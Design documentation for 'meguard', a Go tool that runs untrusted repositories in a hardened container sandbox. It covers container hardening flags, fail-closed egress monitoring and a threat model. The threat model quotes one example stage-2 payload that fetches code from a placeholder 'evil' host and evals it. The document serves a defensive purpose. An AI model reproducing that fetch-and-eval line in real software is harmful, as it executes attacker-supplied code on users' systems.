# meguard documentation

## Overview

meguard executes untrusted repositories inside a locked-down container sandbox.
This document covers the architecture of the `run` path, each hardening flag and
the door it closes, the threat model, and the (documented-only) scan analyzer
architecture.

## Architecture

### Packages

- `main.go` - entry point. Builds a signal-aware context (SIGINT/SIGTERM) and
  hands it to the CLI so Ctrl-C cancels in-flight work.
- `cmd/` - cobra wiring. `run` resolves the repo source, builds a Profile, prints
  the pre-run notice, drives the lifecycle, and prints the result. This package
  never imports analyze.
- `internal/sandbox/` - the sandbox engine: the `Runner` interface, the
  `DockerRunner` CLI implementation, the `Profile` type, the pure `createArgs`
  builder, the `Execute` orchestrator, and the optional `EgressInspector`
  (`egress.go`: monitor argv, sinkhole script, and the pure `parseEgress`
  parser). This package never imports analyze.

### The Runner interface

`Runner` (in `internal/sandbox/runner.go`) abstracts the container lifecycle:

    Create(ctx, Profile) (id, error)
    CopyInto(ctx, id, srcDir, destPath) error
    Start(ctx, id) error
    Exec(ctx, id, cmd, stdout, stderr) (exitCode, error)
    Remove(ctx, id) error

The only implementation is `DockerRunner`, which shells out to the `docker` CLI
via `os/exec`. Defining the interface now keeps the door open for stronger
backends without touching callers.

There is one OPTIONAL companion interface, `EgressInspector` (in
`internal/sandbox/egress.go`):

    StartMonitor(ctx, Profile) (monitorName, error)
    CollectEgress(ctx, monitorName) ([]EgressEvent, error)

`Execute` type-asserts for it only when `Profile.InspectEgress` is set, so a
`Runner` that does not implement it is unaffected and the default (`--network
none`) path never touches egress code. `DockerRunner` implements it. See
"Egress inspection" below.

The container daemon is a TRUST BOUNDARY: it runs privileged, and meguard trusts
it to enforce the isolation configured at create time. meguard does not trust the
repo code that runs inside.

Upgrade paths, in preference order for a security tool:

1. Docker Go SDK - if parsing CLI output becomes fragile, swap the exec calls
   for the SDK behind the same `Runner` interface.
2. Podman rootless - removes the root-daemon trust boundary.
3. gVisor (runsc) - a user-space kernel, stronger syscall isolation.
4. Firecracker microVMs - the strongest kernel boundary.

### The Profile: zero value is safe

`Profile` (in `internal/sandbox/profile.go`) carries only NON-security choices:
the ecosystem image, the install command, and resource ceilings (memory, CPUs,
PID limit). Every security control is hardcoded in `createArgs` and is not a
field, so:

- The zero-value Profile is the safest Profile.
- A forgotten or zero field cannot open a hole; it can only fall back to a
  locked-down default via `Normalize`.
- Configuration only ever RELAXES ceilings or selects an ecosystem; it can never
  weaken isolation.

`Normalize` fills empty fields with conservative defaults (node:20-slim,
`npm install`, 2g, 2 CPUs, 512 PIDs) and never removes a control.

`InspectEgress` follows the same rule at the library level: its zero value is
`false`, which yields `--network none` (the safest, no-stack mode), so a
forgotten field still cannot open a hole. The `run` CLI, however, defaults
`InspectEgress` to `true` (`--strict` sets it back to `false`) - a deliberate
product choice to make egress visible by default. The distinction matters: the
zero-value Profile is `--network none`; the CLI, not the library, is what opts
into inspection.

### The lifecycle

`Execute` (in `internal/sandbox/execute.go`) runs:

    create <hardened args> <image> sleep infinity
    docker start <id>
    docker exec -i <id> tar -xf - -C /repo   (repo streamed into the tmpfs)
    docker exec <id> <install cmd>           (stdout/stderr streamed live)
    docker rm -f <id>                        (always)

Copy mechanism: meguard does NOT use `docker cp`. Docker refuses `docker cp` into
a --read-only container, so meguard builds a deterministic tar stream in-process
(internal/sandbox/copy.go, `writeRepoTar`) and pipes it to a `tar` process
running inside the container via `docker exec -i`. That extractor writes to the
/repo tmpfs as the sandbox user and is not subject to the read-only rootfs guard.
The repo therefore lives in a container tmpfs with no host bind mount, exactly as
invariant 2 requires. The container is STARTED before the copy because the copy
runs inside it. The image must provide `tar` (standard in Debian and Alpine
bases). The /repo tmpfs is mounted `mode=1777` so the non-root user can write it.

Cleanup guarantee: immediately after a successful create, `Execute` defers a
`Remove` that uses a DETACHED context with its own timeout. Deferred functions
run after any return and during panic unwinding, and the detached context is not
cancelled when the caller's ctx is (Ctrl-C). So `docker rm -f` runs on success,
on install failure, on panic, and on Ctrl-C.

Before any of this, `run` performs a preflight: `DockerRunner.Preflight` runs
`docker info` to confirm a Docker-compatible runtime is reachable. If it is not,
`run` fails fast, before cloning or printing the pre-run notice, with an
actionable error that names OrbStack, Colima, and Podman and states Docker
Desktop is not required. This turns a raw daemon connection error into guidance
and avoids showing protections for a run that cannot start.

The repo source is resolved in `cmd/run.go`:
- A git URL is `git clone --depth 1 -- <source>`ed to a temp dir that is always
  removed. Cloning does not run install hooks, so it is safe on the host. The
  `--` terminates git option parsing so an attacker-controlled source that
  begins with `-` can never be smuggled in as a git flag (defense in depth on
  top of the `isGitURL` gate). `--depth 1` also avoids submodule recursion.
- A local path is used in place (its contents are copied into the container, not
  bind mounted).

### Runtime selection (`--runtime`)

`--runtime` chooses the Docker-compatible CLI that enforces the sandbox (default
`docker`); it maps directly to `DockerRunner.Binary`. Any compatible CLI works
(`podman`, `nerdctl`, ...). Because the daemon is the trust boundary (see the
threat model), a rootless runtime such as `--runtime podman` is preferred for
hostile code: a container escape then lands as an unprivileged user instead of
host root. The pre-run notice prints the chosen runtime and labels it the trust
boundary.

### Egress inspection (default; `--strict` opts out)

Egress is always denied. `--strict` gives `--network none`: no network stack at
all, so a blocked connection attempt leaves no trace to report. The DEFAULT is
the OBSERVABLE posture (still no egress): a monitor sidecar whose network
namespace the sandbox joins. It is implemented as follows, and if the monitor
cannot start the CLI falls back to `--network none` (see the fallback note at the
end of this section):

1. `StartMonitor` creates a hardened monitor container (`--cap-drop ALL` then
   only `--cap-add NET_ADMIN` `--cap-add NET_RAW`, `no-new-privileges`,
   `--read-only`, resource caps). It runs NO repo code.
2. The monitor's shell (`monitorScript`) seals its netns FAIL-CLOSED. It brings
   up a dummy `sink0` interface and points the default route at it so a
   `connect()` to an external address still produces a packet that reaches the
   OUTPUT chain (instead of failing with ENETUNREACH and logging nothing). It
   forces all DNS (any destination, including Docker's embedded `127.0.0.11`) to
   the sinkhole via `iptables -t nat ... DNAT`. Then, in the filter table, it
   accepts loopback, logs everything else via `NFLOG`, and sets the OUTPUT
   policy to DROP - for IPv4 and, when an IPv6 stack is present, IPv6. The DROP
   POLICY (not an interface-specific rule) is what enforces no-egress, so
   containment does not depend on the uplink being named `eth0` or on any single
   route the script removed. Every setup command runs WITHOUT `|| true`, so under
   `set -e` any failure aborts the script before the readiness marker; the script
   also explicitly verifies the DROP policy and NFLOG rule applied before echoing
   the marker. It then execs `tcpdump -i nflog:<group> -n -l`, which captures IN
   the OUTPUT chain (before the drop), independent of egress interface.
3. `Execute` waits for the readiness marker (`waitForMonitorReady`) BEFORE
   creating the sandbox. If it never arrives, or if the monitor process EXITS
   before printing it (a fail-closed abort, detected via `containerExited` so it
   is reported immediately rather than waited out), the monitor is removed and
   the run fails: the sandbox is never created, so it can never join an unsealed
   netns. Capture (tcpdump) runs only after the seal is verified, so losing
   capture loses logs, never containment.
4. The sandbox is created with `--network container:<monitor>` (the ONE
   conditional flag in `createArgs`, via `networkArgs`) and every other
   hardening flag unchanged. It joins the netns but gains NO capability; the
   kernel enforces the sinkhole rules and the unprivileged sandbox cannot alter
   them.
5. After the install, `CollectEgress` reads the monitor's captured output
   (`docker logs`), and the pure `parseEgress` parser turns tcpdump lines into a
   deduplicated, ordered `[]EgressEvent` (`tcp <ip:port>` or `dns <name>`).
   Reading the monitor is best-effort: a failure to read is reported but does
   NOT fail the run, because containment does not depend on the report.
6. BOTH containers are force-removed. `Execute` defers a detached-context
   `Remove` for the monitor and one for the sandbox; LIFO ordering removes the
   sandbox (which shares the netns) before the monitor (invariant 5, extended to
   the pair).

Reporting is explicit: a clean inspected run states "0 outbound attempts", never
silence; an unreadable monitor says so and never claims zero. The monitor image
is `nicolaka/netshoot` by default and overridable with `--monitor-image`; it must
provide `ip` (iproute2), `iptables`, and `tcpdump`.

LIVE-VERIFICATION: the Go orchestration, argv, output, `parseEgress`, and the
fail-closed ordering are unit tested, and the in-container netns/iptables/NFLOG
seal has been verified on Docker/OrbStack (a real Linux kernel). The passing
checklist: a hardcoded-IP SYN is logged (`BLOCKED tcp <ip>:<port>`) and the fetch
times out; a connection to a sibling container on the docker bridge subnet does
NOT leak (proving the OUTPUT DROP policy seals on-link routes, not just the
default route); DNS is captured by name (`BLOCKED dns <name>`); IPv6 is blocked;
a no-call run reports "0 outbound attempts"; the monitor-unavailable path falls
back to `--network none`; and no containers leak. Not yet checked: rootless
runtimes (Podman) and non-`nfnetlink_log` kernels - on those the monitor fails to
start and the CLI falls back to `--network none`. The library zero-value Profile
still selects `--network none`; `--strict` selects the no-stack mode directly.

One timing detail from that verification: Execute waits `monitorFlushDelay`
(~1.2s) after the install command exits before reading the monitor log, so a
single fast packet (e.g. one DNS query from an install that exits immediately)
does not race tcpdump's line-buffered flush and get missed.

Fallback: because inspected mode is experimental and needs a monitor image plus
NFLOG, `Execute` wraps any monitor-start failure in `ErrMonitorUnavailable`. In
the default (non-strict) mode the CLI catches that, prints a warning, and re-runs
with `--network none`. This never weakens containment (no-stack is stronger than
inspected) - it only loses the egress logs for that run, and the fallback is
printed, never silent. `--strict` never inspects, so it has nothing to fall back
from.

## Hardening flags and the door each closes

From `internal/sandbox/args.go`, all unconditional except the network flag noted
below:

| Flag | Door it closes |
| --- | --- |
| `--user 1000:1000` | Never run as root inside the container. |
| `--cap-drop ALL` | Drop every Linux capability. |
| `--security-opt no-new-privileges` | Block setuid/privilege escalation. |
| `--read-only` | Root filesystem is immutable. |
| `--tmpfs /repo:exec,mode=1777` | Repo lives in ephemeral RAM; execution allowed; writable by the non-root user. |
| `--tmpfs /home/sandbox` | Scratch HOME in RAM; holds no host secrets. |
| `--tmpfs /tmp` | Writable scratch in RAM only. |
| `--pids-limit 512` | Cap fork bombs. |
| `--memory 2g` | Cap memory (conservative; will be configurable). |
| `--cpus 2` | Cap CPU (conservative; will be configurable). |
| `--network none` | No egress at all; kills stage-2 payload fetches. This is the ONLY conditional flag: it is used with `--strict`; the DEFAULT (inspected) mode instead uses `--network container:<monitor>` (join the monitor's sealed, no-route netns), which is still no egress but observable. See "Egress inspection". |
| `-w /repo` | Work in the copied repo. |
| `-e HOME=/home/sandbox` | HOME points at scratch tmpfs, not host home. |

## Threat model

Adversary: a repository that looks like a normal take-home or interview project
but contains a payload intended to steal host secrets (SSH keys, cloud creds,
crypto wallets, browser data) or install a RAT. Typical delivery is an npm
`postinstall` hook or an obfuscated blob evaluated at install time.

What meguard denies:

- Host code execution: repo code only runs inside the container, never on the
  host. meguard only clones/copies on the host.
- Host filesystem access: no bind mounts of the repo or `$HOME`; the repo is
  copied into a container tmpfs. There are no host secrets in the container to
  read.
- Egress: a stage-2 fetch (for example
  `axios.get('https://evil/stage2').then(r => eval(r.data))`) cannot connect, and
  any stolen data cannot be exfiltrated. In the DEFAULT inspected mode egress is
  denied by a fail-closed OUTPUT DROP seal AND each blocked attempt (including
  connections to hardcoded IPs) is logged and reported, so you can SEE what the
  repo tried to reach. With `--strict` egress is denied by absence
  (`--network none`, no stack) with no logs.
- Persistence and escalation: read-only root, tmpfs-only writes, dropped caps,
  no-new-privileges, non-root user, and force-removal on exit leave nothing
  behind and nothing to escalate through.

Out of current scope: kernel escapes from the container runtime and escapes
through a rootful daemon (both reduced, not eliminated, by choosing a rootless
runtime with `--runtime podman`, and further by the documented gVisor/Firecracker
upgrade paths). The single largest residual risk is that the
sandbox is only as strong as the runtime enforcing it on a shared host kernel:
meguard raises the bar with cap-drop, no-new-privileges, read-only root,
non-root user, and no network, but a kernel or root-daemon 0-day still reaches
the host. Prefer a rootless runtime for genuinely hostile code. The `run`
guarantee is independent of scan; scan is a separate, future, static-analysis
feature.

## scan analyzer architecture (documented only; not implemented)

scan will statically analyze a repo before it is ever run. Recorded here so the
future implementation inherits the decisions.

- One `Analyzer` interface; scan is composed of analyzers behind it.
- Pure-Go analyzers (build with CGO_ENABLED=0):
  - manifest: parse package.json, setup.py, pyproject.toml, and similar.
  - entropy: flag base64/hex blobs and minified single-liners.
  - regex: cheap first-pass pattern matching.
- AST analyzer (tree-sitter) is the ONLY analyzer that needs cgo. It is isolated
  behind build tags so it is the sole cgo dependency and degrades to a labeled
  no-op when compiled out. Illustrative seam (not implemented):

      //go:build cgo      -> newASTAnalyzer() returns treeSitterAnalyzer
      //go:build !cgo     -> newASTAnalyzer() returns noopAnalyzer{reason:"AST needs a cgo build"}

- Two build variants ship, same binary name and commands: pure static (no AST)
  and cgo (full).
- Graceful degradation: on the pure build, scan still runs manifest+entropy+regex
  and the AST no-op MUST announce that it is disabled. A clean scan on the pure
  build is NEVER presented as "AST found nothing"; the absence of AST is stated,
  not silent.

### Structural purity

`run` and `sandbox` NEVER import `analyze` or any analyzer package. This is
enforced by `TestSandboxDoesNotImportAnalyze` (in
`internal/sandbox/import_guard_test.go`), which parses `go list -deps` output and
fails if any forbidden import path appears in the sandbox package's transitive
dependencies. The failure direction: the test passes today and fails the moment
sandbox gains such a dependency.

## Upgrade paths summary

- CLI shelling -> Docker Go SDK (same `Runner` interface).
- Docker daemon -> Podman rootless -> gVisor -> Firecracker (increasing
  isolation strength; decreasing trust in a privileged daemon).
